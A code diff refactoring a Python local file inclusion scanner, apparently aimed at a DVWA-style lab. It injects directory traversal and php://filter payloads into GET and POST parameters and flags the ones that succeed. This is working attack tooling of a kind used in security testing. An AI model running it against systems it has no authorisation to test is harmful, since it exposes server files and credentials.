@@ -1,19 +1,17 @@
+#LFI patch clear
 import requests
 import os
 import re
 import base64
 import json
-from urllib import parse
 import time
-cookies = {'PHPSESSID': 'vt91ig60vqh905pk6ldve9efl4', 'security': 'medium'}
-
+from urllib import parse
 
 def make_GET_form(url: str):
     dic = {}
-    dic['vuln'] = ' LFI'
+    dic['vuln'] = 'LFI'
     dic['method'] = 'GET'
     dic['url'] = url
-    print("Find on lIF")
     return dic
 
 
@@ -23,12 +21,10 @@ def make_POST_form(url: str, data: dict):
     dic['method'] = 'POST'
     dic['url'] = url
     dic['data'] = data
-    print("Find on lIF")
     return dic
 
 
-def get_request(data, dic, target):
-    global cookies
+def get_request(data, dic, target, cookies):
     deeper = "../../../../../../../.."
     php_filter = "php://filter/convert.base64-encode/resource="
 
@@ -48,37 +44,36 @@ def get_request(data, dic, target):
             if payload.startswith('%'):
                 final_form = middle_form.replace('@@@@@@', payload.strip())
                 try:
-                    test_res = requests.get(final_form, cookies=cookies,verify=False)
+                    test_res = requests.get(final_form, cookies=cookies)
+                    if check_success(test_res.text):
+                        return make_GET_form(final_form)
                 except:
-                    print("ERROR on LFI")
-                    time.sleep(5)
-                if check_success(test_res.text):
-                    return make_GET_form(final_form)
+                    print('lfi error')
+                    time.sleep(2)
             else:#scan with filename
                 for i in range(0,2):
                     final_form = middle_form.replace('@@@@@@', (deeper*i)+payload.strip())
                     try:
-                        test_res = requests.get(final_form, cookies=cookies,verify=False)
+                        test_res = requests.get(final_form, cookies=cookies)
+                        if check_success(test_res.text):
+                            return make_GET_form(final_form)
                     except:
-                        print("ERROR on LFI")
-                        time.sleep(5)
-                    if check_success(test_res.text):
-                        return make_GET_form(final_form)
+                        print('lfi error')
+                        time.sleep(2)
                 #scan with php filter
                 final_form = middle_form.replace('@@@@@@', php_filter + payload.strip())
                 try:
-                    test_res = requests.get(final_form, cookies=cookies,verify=False)
+                    test_res = requests.get(final_form, cookies=cookies)
+                    if check_success(test_res.text):
+                        return make_GET_form(final_form)
                 except:
-                    print("ERROR on LFI")
-                    time.sleep(5)
-                if check_success(test_res.text):
-                    return make_GET_form(final_form)
+                    print('lfi error')
+                    time.sleep(2)
 
     return False
 
 
-def scan_type1(url: str, params: dict):
-    global cookies
+def scan_type1(url: str, params: dict, cookies):
     deeper = "../../../../../../../.."
     php_filter = "php://filter/convert.base64-encode/resource="
 
@@ -96,48 +91,46 @@ def scan_type1(url: str, params: dict):
             key_list = list(dic.keys())
             for payload_name in key_list:
                 tmp = dic
-                if payload_name.lower() == 'submit':
-                    continue
                 for payload in data:
                     #scan with encode
                     if payload.startswith('%'):
                         tmp[payload_name] = payload.strip()
                         try:
-                            test_res = requests.post(target, data=tmp, cookies=cookies,verify=False)
+                            test_res = requests.post(target, data=tmp, cookies=cookies)
+                            if check_success(test_res.text):
+                                return make_POST_form(target, tmp)
                         except:
-                            print("ERROR on LFI")
-                            time.sleep(5)
-                        if check_success(test_res.text):
-                            return make_POST_form(target, tmp)
+                            print('lfi error')
+                            time.sleep(2)
                     else:#scan with filename
                         for j in range(0,2):
                             tmp[payload_name] = (deeper*j)+payload.strip()
                             try:
-                                test_res = requests.post(target, data=tmp, cookies=cookies,verify=False)
+                                test_res = requests.post(target, data=tmp, cookies=cookies)
+                                if check_success(test_res.text):
+                                    return make_POST_form(target, tmp)
                             except:
-                                print("ERROR on LFI")
-                                time.sleep(5)
-                            if check_success(test_res.text):
-                                return make_POST_form(target, tmp)
+                                print('lfi error')
+                                time.sleep(2)
                         #scan with php filter
                         tmp[payload_name] = php_filter+payload.strip()
                         try:
-                            test_res = requests.post(target, data=tmp, cookies=cookies,verify=False)
+                            test_res = requests.post(target, data=tmp, cookies=cookies)
+                            if check_success(test_res.text):
+                                return make_POST_form(target, tmp)
                         except:
-                            print("ERROR on LFI")
-                            time.sleep(5)
-                        if check_success(test_res.text):
-                            return make_POST_form(target, tmp)
+                            print('lfi error')
+                            time.sleep(2)
 
         elif method == 'get':
-            return get_request(data, dic, target)
+            return get_request(data, dic, target, cookies)
         else:
             print('Error in ' + target + ', method type must be assigned')
             return False
     return False
 
 
-def scan_type2(url: str):
+def scan_type2(url: str, cookies):
     with open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
         data = f.readlines()
 
@@ -152,7 +145,7 @@ def scan_type2(url: str):
         else:
             dic[key] = params[i]
 
-    return get_request(data, dic, target)
+    return get_request(data, dic, target, cookies)
 
 
 def check_success(res):
@@ -163,11 +156,11 @@ def check_success(res):
     return False
 
 
-def lfi_attack(arg1: str, arg2):
+def lfi_attack(arg1: str, arg2, cookies):
     if arg1.startswith('http'):
-        return scan_type1(arg1, arg2)
+        return scan_type1(arg1, arg2, cookies)
     elif arg1 == 'get':
-        return scan_type2(arg2)
+        return scan_type2(arg2, cookies)
     else:
         print('Error in lfi_attack')
         return False
